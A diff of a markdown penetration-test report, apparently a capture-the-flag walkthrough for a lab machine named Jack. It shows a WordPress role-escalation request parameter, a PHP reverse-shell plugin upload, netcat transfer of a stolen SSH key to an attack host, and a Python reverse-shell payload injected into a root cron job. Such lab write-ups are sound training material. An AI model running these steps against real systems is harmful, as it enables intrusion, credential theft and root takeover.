@@ -121,58 +121,144 @@ Wendy             | changelater
 
 ![{93463B0A-29C8-49FB-96BF-9E3CA3BE5C53}](https://github.com/user-attachments/assets/22419621-671c-46bf-aaa1-de03e7817010)
 
+Now that we have enough information lets continue with the exploitation.
+We can start by logging into Jack’s Wordpress site at http://jack.thm/wp-admin using the credentials obtained earlier.
+Once logged in we realize that there's not much we can do so we need to enumerate a little more 
 
+![{19D47617-20CB-450A-AC97-AE0931D91274}](https://github.com/user-attachments/assets/b7ecba2c-6ba2-4f2a-9d0a-d50e2f425698)
 
+There are multiple other tools to enumerate Wordpress with, but lets revert back to Nmap with the following command
 
-### Initial Access - WordPress Plugin User Role Editor < 4.25 - Privilege Escalation
+![{C8430A1F-2844-440E-8D09-D3EEF958DF35}](https://github.com/user-attachments/assets/33911f23-5773-4a76-8594-ccfeca0771c0)
 
-**Vulnerability Explanation:** Ability Server 2.34 is subject to a buffer overflow vulnerability in STOR field.
-Attackers can use this vulnerability to cause arbitrary remote code execution and take completely control over the system.
+We see a plugin with a known WordPress privilege escalation vulnerability called user-role-editor.
+A simple search on searchsploit reveals the specific exploit.
 
-**Vulnerability Fix:** The publishers of the Ability Server have issued a patch to fix this known issue.
-It can be found here: http://www.code-crafters.com/abilityserver/
+![{568F4912-7BE0-402A-820E-BBD083CDD7D6}](https://github.com/user-attachments/assets/7de0789e-8213-4cbd-9ddd-9126a733fbc6)
+
+After reviewing the exploit and some simple googling I constructed a fairly simple procedure using Burpsuite to gain privileged access to the Wordpress portal.
+
+### Initial Access - WordPress Plugin User Role Editor < 4.25
+
+**Vulnerability Explanation:** The plugin allows you to modify user roles in WordPress (permissions, capabilities, etc.).
+The attacker (already with access to an account with a lower role, such as Editor) can send a malicious request to modify their own role or that of other users. This gives them access to critical functions, such as installing plugins, editing code, or changing site settings.
+
+**Vulnerability Fix:** Update the plugin to version 4.25 or higher.
 
 **Severity:** Critical
 
-**Steps to reproduce the attack:** The operating system was different from the known public exploit.
-A rewritten exploit was needed in order for successful code execution to occur. Once the exploit was rewritten, a targeted attack was performed on the system which gave John full administrative access over the system.
-
-**Proof of Concept Code Here:** Modifications to the existing exploit was needed and is highlighted in red.
+**Proof of Concept Code Here:** 
 
 ```python
+-Log into Wordpress using obtained credentials
+-Select “Profile”
+-Start Burpsuite or http proxy of choice and start capturing web traffic
+-Select “Update Profile”
 
+-In Burpsuite take a look at the captured HTTP POST and add the following string at the end of the post “&ure_other_roles=administrator”
+
+Code: &ure_other_roles=administrator
 ```
 
 **Proof Screenshot:**
 
-IMATGE
+![{087D3C19-69F0-420E-975F-D45738726FC1}](https://github.com/user-attachments/assets/c6940e41-9da4-4904-8b93-31683116e751)
 
-\newpage
+Click “Forward” to submit the HTTP Request and refresh the Wordpress Admin page, now showing more admin options, including the “Plugins” Menu.
 
-### Privilege Escalation - MySQL Injection
+![{4815834E-CE07-4D72-B7C7-9CACB5928C99}](https://github.com/user-attachments/assets/204c02f5-153e-4175-8e80-51c66bbec69d)
 
-**Vulnerability Explanation:** After establishing a foothold on target, John noticed there were several applications running locally, one of them, a custom web application on port 80 was prone to SQL Injection attacks.
-Using Chisel for port forwarding, John was able to access the web application.
-When performing the penetration test, John noticed error-based MySQL Injection on the taxid query string parameter.
-While enumerating table data, John was able to successfully extract the database root account login and password credentials that were unencrypted that also matched username and password accounts for the administrative user account on the system and John was able to log in remotely using RDP.
-This allowed for a successful breach of the operating system as well as all data contained on the system.
+Next we need to get a reverse shell. In order to get the reverse shell I will create a custom Wordpress plugin containing a simple PHP Reverse Shell.
+Create a new PHP file on your attack machine containing the following. I called it shell-plugin.php
 
-**Vulnerability Fix:** Since this is a custom web application, a specific update will not properly solve this issue.
-The application will need to be programmed to properly sanitize user-input data, ensure that the user is running off of a limited user account, and that any sensitive data stored within the SQL database is properly encrypted.
-Custom error messages are highly recommended, as it becomes more challenging for the attacker to exploit a given weakness if errors are not being presented back to them.
+![{D9852A2B-B301-42B0-AAC2-A907CFB6A0FF}](https://github.com/user-attachments/assets/05ab14e3-ec94-474a-87d5-358de25ae299)
+
+Create a zip file from from the above PHP file using the following.
+
+![{E8EFA2F1-9BF2-4D15-94D0-65FD053CAFF3}](https://github.com/user-attachments/assets/464fae7e-f5ca-4cd2-850d-c203a9218710)
+
+Start netcat listener.
+
+![{1721D29A-6E51-48B0-AF4B-293B0AD37FFB}](https://github.com/user-attachments/assets/3b0046e8-a3c6-4e82-b276-555f1bb2237b)
+
+Next we’ll upload the plugin and activate reverse shell.
+
+![{70F4389F-C527-4B97-A586-C9AA21FBB869}](https://github.com/user-attachments/assets/c6f0200f-acc5-44e1-a706-b5378a1bca81)
+
+![{F595969E-C742-4A01-A689-AAA648BA14C3}](https://github.com/user-attachments/assets/50ab2649-54cf-4b0e-a33e-7539f1788b78)
+
+We already have the shell and we are inside the machine.
+
+![{A01C7814-A823-4989-8F75-EE18C68C8A99}](https://github.com/user-attachments/assets/7a06c1fe-cdfa-47f4-bc64-3b10f114cfcd)
+
+### Privilege Escalation - Scheduled task
+
+During the enumeration process I found a file in “/home/jack” called “reminder.txt”. This file led me to “/var/backups” where I found a SSH Private key to use for authentication called “id_rsa”
+In order to use the file we first need to transfer the file to our attack machine, I used netcat with the following steps to transfer the file.
+
+![{5BDFE159-26CC-49FA-9FE5-EFF3E3EF4D9F}](https://github.com/user-attachments/assets/fa0a79e6-10f5-4cf3-a9ed-bd7f3653d240)
+
+![{3171309C-CED3-4C70-B1CD-91C592576F3D}](https://github.com/user-attachments/assets/81610b5a-0887-422b-a321-0cb0dc28458a)
+
+To use the file, we first need to transfer it to our attack machine. I used netcat with the following steps to transfer the file.
+
+On the attack machine, we start its netcat listener to receive the file: "sudo nc -nlvp 443 > id_rsa"
+
+![{339741B0-9760-4471-820F-B5F6BB2575D9}](https://github.com/user-attachments/assets/eb304cb6-a94f-4b6b-8e47-cfb859b3ea0c)
+
+On the target machine, we send the file to the attack machine using netcat by issuing the following command: "nc -nv <ATTACK IP> 443 < id_rsa"
+
+![{96612589-CBD1-4167-9014-17300A8E0EAB}](https://github.com/user-attachments/assets/7256512e-b247-4752-9924-5e438535c6b2)
+
+Once we have the file on the attack machine, we can use it to gain access to the target using SSH.
+Assign the correct privileges to the SSH key using the following command: "chmod 600 id_rsa"
+
+ssh -i id_rsa jack@<TARGET IP>
+
+![{29FEBA1D-0552-45C1-8961-0CEC352E5D67}](https://github.com/user-attachments/assets/5d85edec-81d4-418e-9a46-726232cab025)
+
+Great! We are now connected as Jack. Let’s find a way to elevate our privileges. Standard enumeration tools like linpeas.sh are great, but there is a great tool called pspy that will be particularly handy in our case.
+
+![{3C7BCE91-6206-472E-A332-372439D3A6D2}](https://github.com/user-attachments/assets/e806f852-b2b3-4bc5-ab3c-3ce67a9f0606)
+
+Using pspy, we can notice that there is a cron job running every 2 minutes:
+
+![{3B21CDA6-8620-4866-B411-76F375EED2B3}](https://github.com/user-attachments/assets/3bba80c7-16b1-4b34-9e3b-4172de98e74c)
+
+It appears the script does a simple http query to http://localhost using curl and then outputs everything to /opt/statuscheck/output.log.
+When we take a look at the python script you’ll notice that it actually imports the Python OS module.
+
+![{2B5E23B7-C6AD-4ADA-ABE8-5E6C9B94AB42}](https://github.com/user-attachments/assets/fcaf9e9c-6971-4912-aa57-c9f5eb5ef0c6)
+
+Checking the rights we see that the family group of which we are a member has sufficient rights to the file.
+
+![{1FBE5677-0A01-4C04-A094-0E79C27E7537}](https://github.com/user-attachments/assets/e9d0bb42-e873-4141-b456-e842e31d0011)
+
+We edit the os.py file and add the following at the end of the file.
+
+![{043188E5-8515-4FC5-83A3-DDB7B7D1D155}](https://github.com/user-attachments/assets/8f044f61-40ed-4f73-acea-49d91cf09f94)
+
+We wait a minute or two and we get the session as root!
+
+![{7B3C248C-71FD-4CDC-9A39-B6833A9F07A1}](https://github.com/user-attachments/assets/bd9bb103-9ba5-466f-b5c9-073ecc7d355b)
+
+**Vulnerability Explanation:** Using the scheduled task of the checker.py script we have been able to modify the module that was imported so that root (which is the user that runs the script on the system) sends us a shell to our victim computer.
+
+**Vulnerability Fix:** Modify script permissions.
 
 **Severity:** Critical
 
-**Steps to reproduce the attack:**
-
 **Proof of Concept Code Here:**
 
-```sql
-SELECT * FROM login WHERE id = 1 or 1=1 AND user LIKE "%root%"
+```python
+import socket
+import pty
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.9.1.238",443))
+dup2(s.fileno(),0)
+dup2(s.fileno(),1)
+dup2(s.fileno(),2)
+pty.spawn("/bin/bash")
 ```
 
-### Post-Exploitation
 
-**System Proof Screenshot:**
-
-IMATGE
